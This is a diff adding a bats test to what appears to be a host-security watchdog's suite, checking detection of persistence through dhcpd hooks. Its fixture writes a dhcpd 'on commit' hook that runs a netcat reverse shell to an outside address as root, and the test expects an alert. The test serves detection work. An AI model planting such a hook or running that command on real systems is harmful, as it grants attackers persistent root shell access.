@@ -248,3 +248,19 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in dhcpd execute(): netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family (sshrc/csh-config/logrotate/systemd-power-hooks/bash-
+    # completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
+    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
+    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession/
+    # acpi-hooks/at-jobs). Lock the netcat axis on the DHCP-lease-
+    # event root-exec persistence surface (T1546 — dhcpd executes
+    # the named binary AS ROOT on every lease-grant / lease-release
+    # event, a recurrent trigger).
+    printf 'on commit { execute("/bin/sh", "-c", "nc -e /bin/sh 1.1.1.1 4444"); }\n' > "${CONF}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
